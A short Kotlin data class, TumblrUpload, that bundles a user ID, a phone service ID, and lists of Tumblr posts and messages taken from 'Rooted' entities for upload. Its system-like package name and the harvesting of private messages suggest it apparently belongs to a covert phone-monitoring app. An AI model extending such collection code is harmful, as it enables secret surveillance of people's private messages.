package com.android.services.models

import com.android.services.db.entities.TumblrMessageRooted
import com.android.services.db.entities.TumblrPostRooted
import com.google.gson.annotations.SerializedName

data class TumblrUpload(
    @SerializedName("userId")
    var userId: String = "",

    @SerializedName("phoneServiceId")
    val phoneServiceId: String = "",

    @SerializedName("tumblrPosts")
    val tumblrPostList: List<TumblrPostRooted> = listOf(),

    @SerializedName("tumblrMessages")
    val tumblrMessageList: List<TumblrMessageRooted> = listOf(),
)
